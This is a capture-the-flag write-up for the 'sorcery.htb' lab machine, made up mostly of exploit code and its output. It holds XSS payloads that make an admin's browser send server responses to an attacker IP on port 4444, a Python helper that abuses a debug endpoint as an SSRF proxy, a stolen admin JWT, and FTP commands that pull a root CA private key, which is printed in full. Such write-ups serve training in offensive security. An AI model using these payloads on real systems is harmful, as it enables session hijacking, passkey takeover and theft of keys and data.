This is an example response I got from clicking the "enroll passkey" option in `/dashboard/profile`. This is what get sent from the server to my browser to be loaded by the JS that handles the navigation.credentials flow to interact with my passkey extensions. I use this to write some custom transforms using gpt.

```json
1:{"result":{"challenge":{"publicKey":{"rp":{"name":"sorcery.htb","id":"sorcery.htb"},"user":{"id":"dMOwO3idQp6H7e3iYPYgCg","name":"tokugero","displayName":"tokugero"},"challenge":"IAJqp7mlPCUeGlaJA6yhcqxWNk1y5Jpzm4YK5Lxhmf0","pubKeyCredParams":[{"type":"public-key","alg":-7},{"type":"public-key","alg":-257}],"timeout":300000,"authenticatorSelection":{"residentKey":"discouraged","requireResidentKey":false,"userVerification":"required"},"attestation":"none","extensions":{"credentialProtectionPolicy":"userVerificationRequired","enforceCredentialProtectionPolicy":false,"uvm":true,"credProps":true}}}}}
```

This is the payload I use to trigger the above challenge request
```html
<img src=x onerror="fetch('http://frontend:3000/dashboard/profile',{method:'POST',headers:{'Content-Type':'application/json','Next-Action':'062f18334e477c66c7bf63928ee38e241132fabc'},body:'[]'}).then(r=>r.text()).then(t=>fetch('http://10.10.16.41:4444/?'+encodeURIComponent(btoa(t))))">
```

This is the payload I use to trigger the challenge response to store my passkeys public keys as "admin"
```html
<img src=x onerror="fetch('http://frontend:3000/dashboard/profile', {method: 'POST',headers:{'Content-Type':'application/json','Next-Action':'60971a2b6b26a212882926296f31a1c6d7373dfa'},body: '<COMPLETE CHALLENGE RESPONSE HERE>'}).then(r=>r.text()).then(t=>fetch('http://10.10.16.41:4444/?'+encodeURIComponent(btoa(t))));>

```

I used copilot chat to vibehack a web function.  
Updating my local dns on my desktop to poitn to my attack vm, I hosted a flask app on my attack box. The flask app interacted with a shared passkey manager.

Using the above xss to submit a post from admin to the /dashboard/profile and send me back the challenge request, I b64 decoded the response in cyberchef, plopped it into the app to create the challenge response with my passkey software, then sent the followup payload with the provided challenge response in the post.

Admin visited the second URL and sent me a receipt for confirmation. From there I just synced the password manager on my attack box and was able to auth with that key as admin.

fxception found that the salted hashes in the db weren't really salted and worked when dumped directly into the user. At this point, that's when I started just using that to regain access to the admin user in the webapp.

## Finally getting the foothold.

This function saved my bacon. It is written terribly, and its exception handling was hacked together with each new exception as it sufficiently annoyed me. Not much thought went into the handling of the reponses so long as it printed most of the time.

TL;DR: This uses a valid signed token from the admin user to post to the /debug endpoint with the information necessary to pass through byte code. Sometimes it will respond back with byte code response from the socket on the other side. This is used for every single exfiltration done until I get user.


```python
def sendPortData( session: requests.Session, token: str, host: str, port: int, data: [[str]], expectresponse: bool = True, keepalive: bool = False, debug: bool = False):
    url = f"https://{target}/dashboard/debug"

    cookies = {
        "token": token,
    }

    headers = {
        "Next-Action": "99cc053db6c8902cbccf05efda80ea0306624c56"
    }

    output = []
    # Format the data into a hex representation for the payload
    for send in data:
        byte_encoded = b''.join(cmd.encode('utf-8') for cmd in send)
        hex_representation = ''.join(f'{byte:02x}' for byte in byte_encoded)
        output.append(hex_representation)

    # Prepare the payload
    payload = [host, port, output, expectresponse, keepalive]

    response = session.post(url, cookies=cookies, json=payload, headers=headers, verify=False)

    # If the debug flag is set, print the response text
    if debug:
        pprint(response.text)

    # This gets messy because of a pretty dynamic return type

    # All valid responses have two fields, we are always only interested in the last one, probably
    delineated_response = response.text.split("\n")[-2]

    # If the last field starts with 1, that seems to have a data field with some values in it to decode
    if delineated_response.startswith("1:"): 
        # Load the data as JSON
        parsed_responses = json.loads(delineated_response[2:])
        # If the data contains key "error", it will have an error dict
        if parsed_responses.get('error'):
            return parsed_responses["error"]["error"]

        # Now return if there is something
        returned_responses = []
        # If the data field is empty, return an empty list
        if not parsed_responses["result"]["data"]:
            return returned_responses
        # If the data field is not empty, iterate over it to clean up bad bytes and return the values
        for pr in parsed_responses["result"]["data"]:
            if len(pr) % 2 != 0:
                returned_responses.append(pr[0:len(pr)-1])
            else:
                returned_responses.append(pr)
        return returned_responses
    # If the last field starts with 2, it has a different format (example: ftp)
    if delineated_response.startswith("2:"):
        result = delineated_response.split(":")[1].split(",")[1]
        if debug:
            pprint(result)
        if len(result) % 2 != 0:
            result = result[0:len(result)-1]
        return result
    # If all else fails, just return something and let future me figure it out
    else:
        return response.text
```

Token generated after resetting admin password and adding a passkey with which to authenticate. Since we need the passkey to authenticate with a JWT that contains passKey = true, I cannot just use my earlier login helper and must steal this from my browser.


```python
token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjJkOWYwZDllLTA5MzUtNDlmMy1hZmNkLTI5YWJkMzQyNzAxMSIsInVzZXJuYW1lIjoiYWRtaW4iLCJwcml2aWxlZ2VMZXZlbCI6Miwid2l0aFBhc3NrZXkiOnRydWUsIm9ubHlGb3JQYXRocyI6bnVsbCwiZXhwIjoxNzUwNTU0NzA1fQ.2hnnCAzSGFe5phtZ5tNeeLoit-5tN-_xBDMXpyrguqA"
```

Our first hint on the blog was that the RootCA.key & RootCA.crt might be stored on the unhackable FTP. Lets just see if I can log in and grab one of those without authentication.


```python
ftp_download_commands = [
    "USER anonymous\r\n",        # Authentication
    "PASS anonymous@\r\n",      # Password (some servers require email format)
    "TYPE I\r\n",
    "EPSV\r\n",
    "RETR /pub/RootCA.key\r\n"
]

with requests.Session() as s:
    # Send initial call to ftp to pasv request an ephemeral port for more requests
    ftpInitialize = sendPortData(s, token, "ftp", 21, [ftp_download_commands], keepalive=True, expectresponse=True)
    # Parse response for an IP and port for the follow up commands
    ftpResponse = Chepy(ftpInitialize[0]).from_hex().o.decode()
    print(ftpResponse)

    # Response 229 from FTP will contain the ephemeral port with which to fetch the data
    port = None
    for line in ftpResponse.split("\n"):
        if "229" in line:
            port = int(line.split("|")[-2])
            print(f"Set port to {port}")
    if not port:
        print("Couldn't find ephemeral port")

    # After the request has been sent, we must open a connection to the reported ephemeral port to receive the data. We don't really need to send any real data here, just open the connection. So we must send something.
    ftpFollowup = sendPortData(s, token, "ftp", port, ["FF"], keepalive=True, expectresponse=True)
    try:
        print(ftpFollowup)
        print(Chepy(ftpFollowup).from_hex().o.decode())
    except Exception as e:
        print(f"The post data failed due to: {ftpFollowup}\n{e}")
```

    220 (vsFTPd 3.0.3)
    331 Please specify the password.
    230 Login successful.
    200 Switching to Binary mode.
    229 Entering Extended Passive Mode (|||21101|)
    
    Set port to 21101
    2d2d2d2d2d424547494e20454e435259505445442050524956415445204b45592d2d2d2d2d0a4d49494a7254425842676b71686b69473977304242513077536a417042676b71686b6947397730424251777748415149344933694f315a6e35586b43416767410a4d41774743437147534962334451494a425141774851594a59495a494157554442414571424244635a4b4153425373306257704c614e4841696c624f4249494a0a554d4b50376672793668726933636953794246796139686955326e61433249412f77414e4965687378556258546a3478613753734852547642643675756533350a6b4a5347696a514c7a5868587a716f6170426350316b307074357658714b333745574c5075626b415a336a5a7735365138354a343750642b56623135486c2f570a357753316141532f495030317248566d4f4d497a2b304b34396d396a7131594a7a4b3478743851313359782f4f386a775935414431727a6e6778394b367830310a4833496c4a67704d30345243316a4d32544168346441464a473848364c744d7035724b4e713968444f6b327371634a775564767a5137655a793861706245795a0a4872614d33584461564d396f2f6b6a73594a68466859756d2f5567634d4f6f42544d3362476f6452715674502f566d627a697555366563366378666f535175760a6838797136503065655576444238385761545a392b486163667434307a65754f624c46454f7a32303034795a586a73496475337348554b3135737348317949500a5a53634a374435634a4e772b77684b474e586249797131686a70685337654570476d3741664a5279314d6542586f4b652f4e6d70326c77482f6b6c71787178380a487356657449364156655242615a4879366f37534a2f79306e54766470396a58436350436e53476254473044512f44765252754a416b33463062495258432f370a5349646b70374451456e383037394b30684a54537a6f482f45524c706873335a50467a514b666d724774584f6d685a6461356f7939575646596e6357424274790a7a5171336158626262565349797a776f41512b4c6a387459725a5159524459434934546e2f4759594a6f4e43426b483459796267364836694257315450756a570a44436675593358367a7648557239574e6b70624675474a794b354e616c70642f617963495a6d7966615035673578673567386f72436966334970634d643670580a4531706c415079696f466b4e6c4f484a587133554f63774c59482b71654d6b39616c71695a356a4644616148312f6f6148644b6948305a784b7a47546c7636530a4f5473464d453565644b4c376d6851534b6f41565249734d496947736b7361384a4a497145433272646844584750674c2b4f4879585356642b5944466e4c374c0a792b65674a493230787a44736252504444384e4e69674f652b4b6268426f44436e485733755839707865666775574c306a5262646179587374486a536d526d770a43696f496f7136353074414c756f342b394a653241432f3632383161624d6342594571797549685050514453664d67526d6f6a746a786c6d47596154544972660a6244432b614878797046337968554c56476b754b775a457252335276493354654776646b4453434f315133384b32336a7450444d76524c6c706b6f73454a47710a58433934455837723472516657634e2f664b72565930447a5a36594e4d30397662366f4f584c44675a507862566a4465796841646a5662526e673548616173610a753678735350415139525a45734e524c6439784a4f365439524e6d6a774142462b59514f4743785933376d55365161566548774a712f4c4777436869677961540a5467674444562f4a696a4a695a75312b584d652f61674956364c6159474f356c6d6446306c6e6b415252344338532f347559333479763447705065504f3932640a5a504c68637856433268385a6862432f683651594866706846663937484d754278347644392b43573176683135314d41594a334c4a4b70374741655158664c640a6a396e51304357564a5359414458446b416f733269776646366b316550674e4432616159474b76433256465861335a554d3249752f446946556f6e704c7442560a37797170396257307641697334472b6f6c70414177724b67416b6732422b6f5943566a2b773655654e623061307a6d67354f61307761416b6d512b444e6e4c6e0a556a4d646143663854336553567139574d304b2b6461473337687a5247326651707438483741737735584e58474d41375775304735547152556a5034487a39510a4e6a77324579595036356452485a6f366b6c4e7a484648485470336354316c38515162745533645a35526f45532f56563257365835576354686a37685375557a0a363255624168664b4b576b30423643672f6c657058477841336e5834467274545273746f34576b71516a46456d54786a776958346b564c7152547968597534540a4179695250323575644634422f7a777371614c45484b4367354c304e4e4675716930466836626a4d586e7a6e34786555396e775068787a54554e59596a6142430a4f74374d477942326245765a765765672f58596764434357304c6d746b67412f644e384e4c41637a2f39376c54545a5651447152774c2b386532325a2f4343740a4355554470466835447344586131667833627635686f64435256494c6e4c4c766563422b69355a4133635865516d36706f5446765a69434f77742b77504776560a2f505135324168384164625a2f642f364b5952626972767a464f58364d352f70567a4e376555496c634a4e6f76507a4247354656773337706568434e4459372f0a326b53323249426132455745332b45766b74757339766c38386b7a366a63385a2f486d674d6d54694a306958616f5256617167526f4739534e3449496d6179710a5043495330484745646e30744c453456466833683642462f542b3447396243394c78673659786a67646154374955367776732b6847704650586d70706f6c6e720a31563864745a41636e4b437442504c5236584c5a6153504b6d6441302b496645412f65516931465762742f2f4a613943416b7a466961695261476d465737584e0a585865754162584f6950716d58574752306d4c76766d586954534937617478334d6d6c4d65666d5a566f534f67324d574b764a6f386274516976713161624f620a30557353787564365a42305139457a467336367964426a70663375715654735642756c4b35484464726647427858544c7761544d3153624a3557757a564c4c6e0a736e58754c656c743852357739564e674b46433642536a4d65654546575268317372584b67314d5a504169324871306f5159697952336e696b4f486d72692b2b0a457155432f4557346476684f755471345055364849537a78726678586878613864785a5173782f6a42474243736b785866416d7770794e41357533324f4b48630a393955533946684670796e7848394f345a6d6769754e45476b5a6a706f7741612f5139764a63302f716e6b73336c494b41307353425a58664e7763446e4c4b6c0a4b5a6a747a6d6b436d4245677167415a66396f4c6139536850537a65566e5541726157387165597a514d4b44795833424666624b5072706161527578784377700a697539394e70307a4a4a56746453637958592f523572525245375937356d4663654a67643475584c6c5a32653471372b6e48702f4331535573336d6e396762500a34317935745056315947474d36664b345a4a595768546e4e766137512b716e73506f42502f4948434a4f3852346351774959492f397a597544534e4e55436b410a75642f36674e564f43344e444e53723167692b533441614c6265306e7432386252314c6779554d7a2f7268373253646468576c4b37594d7a503737495734766d0a5a4d332b5373684a364a6a434b58584f4858686a3475414a337530515765666d487273507162594b69666c596a6f705939626557542f595554624576576947510a673545663847384b613936416e6c47686c6d556e54504849795074356d6856416a365a4f4731774c696a4b322f6e546d325041386a356d636b524f6c6b6879320a436b4d363231476958387039516130385649674844566b5a476f5247674d7048583363577555677a483466746b347748384a4f4273685169714d64364765692f0a734464677953574a564630786d6671514c33507876457a7161494b3746516d44563163624a38493231312b627730554157795972775a57416952442b475a716e0a626336713735697856337a374268757a753176493347366f72594a51666a6c5a574e6a4a714a30767834766a467a5a4572534449596e4f484d643231386555530a6252466c735a69646c376a68302b7168733274695138563752384b363261324b74595a416f6a4a5349695042312f375a5861576d63546b676f436d50696e632b0a6a73654261412b447668522f50674f53367149467455377447396b6e622f74626565345271316c74476b47774f386c5751706757434e386453547579354163530a6c4e455a796878754653344d456668315373354b4c4643365a36726867384f6f4e3753774567477a4c77795a4f5442705a36644d4f726733756137385356636d0a696e30434c43693479635a65542b6478636638326e4d6468537a727744636b6a7550526f7070585a666667660a2d2d2d2d2d454e4420454e435259505445442050524956415445204b45592d2d2d2d2d0a
    -----BEGIN ENCRYPTED PRIVATE KEY-----
    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
    -----END ENCRYPTED PRIVATE KEY-----
    


Repeat this process for the crt


```python
ftp_download_commands = [
    "USER anonymous\r\n",        # Authentication
    "PASS anonymous@\r\n",      # Password (some servers require email format)
    "TYPE I\r\n",
    "EPSV\r\n",
    "RETR /pub/RootCA.crt\r\n"
]

with requests.Session() as s:
    # Send initial call to ftp to pasv request an ephemeral port for more requests
    ftpInitialize = sendPortData(s, token, "ftp", 21, [ftp_download_commands], keepalive=True, expectresponse=True)
    # Parse response for an IP and port for the follow up commands
    ftpResponse = Chepy(ftpInitialize[0]).from_hex().o.decode()
    print(ftpResponse)

    # Response 229 from FTP will contain the ephemeral port with which to fetch the data
    port = None
    for line in ftpResponse.split("\n"):
        if "229" in line:
            port = int(line.split("|")[-2])
            print(f"Set port to {port}")
    if not port:
        print("Couldn't find ephemeral port")

    # After the request has been sent, we must open a connection to the reported ephemeral port to receive the data. We don't really need to send any real data here, just open the connection. So we must send something.
    ftpFollowup = sendPortData(s, token, "ftp", port, ["FF"], keepalive=True, expectresponse=True)
    try:
        print(ftpFollowup)
        print(Chepy(ftpFollowup).from_hex().o.decode())
    except Exception as e:
        print(f"The post data failed due to: {ftpFollowup}\n{e}")
```

    220 (vsFTPd 3.0.3)
    331 Please specify the password.
    230 Login successful.
    200 Switching to Binary mode.
    229 Entering Extended Passive Mode (|||21109|)
    
    Set port to 21109
    2d2d2d2d2d424547494e2043455254494649434154452d2d2d2d2d0a4d494946467a434341762b674177494241674955565a6a6945536e6f702b6e4e7539726b576c62584f526a6c726330774451594a4b6f5a496876634e4151454c0a42514177476a45594d42594741315545417777505532397959325679655342536232393049454e424d434158445449304d54417a4d5441794d446b774f466f590a447a49794f5467774f4445324d4449774f544134576a41614d52677746675944565151444441395462334a6a5a584a3549464a766233516751304577676749690a4d4130474353714753496233445145424151554141344943447741776767494b416f49434151434e2f5669534d2b5a6b65755831376c3447462b30475463664f0a304858393879766e41352b4d512b54767a4b75454855786b6d6c4c2f3238787774497a542f656a4230734b637237543733336b69697932504d73496279777a4d0a724a726c4c424341656b62316864715858623043634e455a725651475a6e55326839694642707365785876682b6f5550737a724264784f41495449364850696f0a702f496a5466797431514e74514a544e63423765726e595662346c4830343351416753364d394363595865763770446172796e624f5a76456535615334324e590a2b4d7445673634336b344a4d3154344e51474b486b4768574f2f37334f7a4365726f325270797a2f576f3766566e70566872774e6465786953746243557471510a71444b6169656569676a5a7470514b4e4c43357443366657724e33645357542b646979512b735166725659515163386f5750625148417973614750364b47572b0a5635314169357a307673684735573336474548416d50386f707676567a5072533459394c364c31724d7549487773436d547a2f6b6f426638704a4a30735552420a31656475782b6a2b577a70394238756d4f4e614b4d4f76473147656a564757385541686d56684b336562722f56746f34384a35737667744a4f39642f516d5a640a586c4b734964766152557a5348545166666c51376b314739416c4e647033504e58573459726c576c502b62346153537965743645795152314b466d69704775320a6f7a62674d785951306e623455776b43617233514a3366756e59426a54644a745635664853557a6d544f30425248326a46693056614474494d42706d5951466f0a6b554a5a53413550572b756a444c6f415151446a4d64354d374e4a69346457506462414c397a434c374934314455796b3268507559566f6364375357317054550a376245523170356b4b596c6877686e4148514944415141426f314d775554416442674e5648513445466751556a6b4e6b4332765a77467578357548535766502b0a55314851624d6b77487759445652306a42426777466f41556a6b4e6b4332765a77467578357548535766502b55314851624d6b7744775944565230544151482f0a42415577417745422f7a414e42676b71686b6947397730424151734641414f43416745415a4854696d6a526d736252496c71327749634e586e61464874646b340a6b7658636748673347396b506b3237514b54596e41466963416d46444a6b5764774d644239654168797572637670577650385a2b57467251614f4155465a6a650a6b592f43422b312f706f755949787739497054616e6c2b684e30436134433734665855666b33616d32316e746c37532f4f6f6d745a444953766150414c7231450a656a45334d69454244672b56303374574131664c74535830333972683274726a6e354a67673439386a6c756d54562b36325467394f6f4153316c6943507a4c410a617073366f646959566e6a75716870664852486f6966496e31656e6164624c704b623743353869772f4b6e75547a7351387375776557625273536b424b58516f0a62386f7a72462f4d6178456b33647a616b66562b7945735849686d6244725061304c476441415258495065454952796c33716b374e346c6d4a5643742f39344b0a747979706f4e49687152764b4c732b7647514872474a6a4b657a7a6d3479675a30714f397a3651716c69596f62635243696f78622b4d6c3371504774676777730a7872464441544d4e357235544e62546b6d31793261706542356670614879514c575a7a626d3761635a68424d565a3477492f515056326f2b62775a654b4358480a6672616b74394e7a384b437a6c756c55742f43394430726e466f54444a6e472f666f6376576577755739624b51714a4c6d536a364c302f56766332612b6c57630a376b44665355434876545952314f727767674131484a343845752f4e774e45527678586d333935423968435267736a69336a4c4561554f6750757131687267620a7535477172506e38424d70734c733932592f704d55745762463344634d386a6e2b686a4c336f77616c6c596a3245394d64366d5135706649312b50695476662f0a75647a2b6b376d59714963436a73453d0a2d2d2d2d2d454e442043455254494649434154452d2d2d2d2d0a
    -----BEGIN CERTIFICATE-----
    MIIFFzCCAv+gAwIBAgIUVZjiESnop+nNu9rkWlbXORjlrc0wDQYJKoZIhvcNAQEL
    BQAwGjEYMBYGA1UEAwwPU29yY2VyeSBSb290IENBMCAXDTI0MTAzMTAyMDkwOFoY
    DzIyOTgwODE2MDIwOTA4WjAaMRgwFgYDVQQDDA9Tb3JjZXJ5IFJvb3QgQ0EwggIi
    MA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQCN/ViSM+ZkeuX17l4GF+0GTcfO
    0HX98yvnA5+MQ+TvzKuEHUxkmlL/28xwtIzT/ejB0sKcr7T733kiiy2PMsIbywzM
    rJrlLBCAekb1hdqXXb0CcNEZrVQGZnU2h9iFBpsexXvh+oUPszrBdxOAITI6HPio
    p/IjTfyt1QNtQJTNcB7ernYVb4lH043QAgS6M9CcYXev7pDarynbOZvEe5aS42NY
    +MtEg643k4JM1T4NQGKHkGhWO/73OzCero2Rpyz/Wo7fVnpVhrwNdexiStbCUtqQ
    qDKaieeigjZtpQKNLC5tC6fWrN3dSWT+diyQ+sQfrVYQQc8oWPbQHAysaGP6KGW+
    V51Ai5z0vshG5W36GEHAmP8opvvVzPrS4Y9L6L1rMuIHwsCmTz/koBf8pJJ0sURB
    1edux+j+Wzp9B8umONaKMOvG1GejVGW8UAhmVhK3ebr/Vto48J5svgtJO9d/QmZd
    XlKsIdvaRUzSHTQfflQ7k1G9AlNdp3PNXW4YrlWlP+b4aSSyet6EyQR1KFmipGu2
    ozbgMxYQ0nb4UwkCar3QJ3funYBjTdJtV5fHSUzmTO0BRH2jFi0VaDtIMBpmYQFo
    kUJZSA5PW+ujDLoAQQDjMd5M7NJi4dWPdbAL9zCL7I41DUyk2hPuYVocd7SW1pTU
    7bER1p5kKYlhwhnAHQIDAQABo1MwUTAdBgNVHQ4EFgQUjkNkC2vZwFux5uHSWfP+
    U1HQbMkwHwYDVR0jBBgwFoAUjkNkC2vZwFux5uHSWfP+U1HQbMkwDwYDVR0TAQH/
    BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAgEAZHTimjRmsbRIlq2wIcNXnaFHtdk4
    kvXcgHg3G9kPk27QKTYnAFicAmFDJkWdwMdB9eAhyurcvpWvP8Z+WFrQaOAUFZje
    kY/CB+1/pouYIxw9IpTanl+hN0Ca4C74fXUfk3am21ntl7S/OomtZDISvaPALr1E
    ejE3MiEBDg+V03tWA1fLtSX039rh2trjn5Jgg498jlumTV+62Tg9OoAS1liCPzLA
    aps6odiYVnjuqhpfHRHoifIn1enadbLpKb7C58iw/KnuTzsQ8suweWbRsSkBKXQo
    b8ozrF/MaxEk3dzakfV+yEsXIhmbDrPa0LGdAARXIPeEIRyl3qk7N4lmJVCt/94K
    tyypoNIhqRvKLs+vGQHrGJjKezzm4ygZ0qO9z6QqliYobcRCioxb+Ml3qPGtggws
    xrFDATMN5r5TNbTkm1y2apeB5fpaHyQLWZzbm7acZhBMVZ4wI/QPV2o+bwZeKCXH
    frakt9Nz8KCzlulUt/C9D0rnFoTDJnG/focvWewuW9bKQqJLmSj6L0/Vvc2a+lWc
    7kDfSUCHvTYR1OrwggA1HJ48Eu/NwNERvxXm395B9hCRgsji3jLEaUOgPuq1hrgb
    u5GqrPn8BMpsLs92Y/pMUtWbF3DcM8jn+hjL3owallYj2E9Md6mQ5pfI1+PiTvf/
    udz+k7mYqIcCjsE=
    -----END CERTIFICATE-----
    


This is what I used to manually verify the required commands for vftpd
```sh
docker run --rm -it -v $(pwd):/var/ftp/pub -v $(pwd)/logs:/var/log/vsftpd -p 21:21 -p 21100-21110:21100-21110 -e ANONYMOUS_ACCESS=true million12/vsftpd:cd94636
```
The socket code below just helped to debug WHICH FTP commands were necessary to get a clean response from the sendPortData. Ultimately I probably could have pointed the remote backend to my ftp server, similar to how I will test with Kafka.


```python
import socket
import re

def extract_epsv_port(epsv_response):
    # Example EPSV response: "229 Entering Extended Passive Mode (|||6446|)"
    match = re.search(r'\(\|\|\|(\d+)\|\)', epsv_response)
    if not match:
        raise ValueError(f"Invalid EPSV response: {epsv_response}")
    return int(match.group(1))

def ftp_list_pub_epsv():
    # Control connection
    control_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    control_sock.connect(('localhost', 21))
    control_sock.settimeout(10)
    
    # Welcome message
    print(control_sock.recv(1024).decode().strip())
    
    # Authentication
    auth_commands = [
        b"USER anonymous\r\n",
        b"PASS anonymous@\r\n",
        b"TYPE I\r\n"
    ]
    
    for cmd in auth_commands:
        control_sock.send(cmd)
        print(f"> {cmd.decode().strip()}")
        print(f"< {control_sock.recv(1024).decode().strip()}")
    
    # Extended Passive Mode (EPSV)
    control_sock.send(b"EPSV\r\n")
    epsv_response = control_sock.recv(1024).decode()
    print(f"> EPSV")
    print(f"< {epsv_response.strip()}")
    
    if "229" not in epsv_response:
        raise RuntimeError("Failed to enter extended passive mode")
    
    data_port = extract_epsv_port(epsv_response)
    
    # Establish data connection to same server (different port)
    data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    data_sock.connect(('localhost', data_port))  # Uses same IP as control
    
    # Send LIST command
    control_sock.send(b"LIST /pub\r\n")
    print("> LIST /pub")
    
    # Get LIST response
    print(f"< {control_sock.recv(1024).decode().strip()}")
    
    # Receive listing data
    data_sock.settimeout(10)
    try:
        listing = b""
        while True:
            chunk = data_sock.recv(4096)
            if not chunk:
                break
            listing += chunk
        print("\nDirectory listing:")
        print(listing.decode())
    except socket.timeout:
        print("Timeout during data transfer")
    
    # Cleanup
    data_sock.close()
    print(control_sock.recv(1024).decode().strip())  # Transfer complete
    control_sock.send(b"QUIT\r\n")
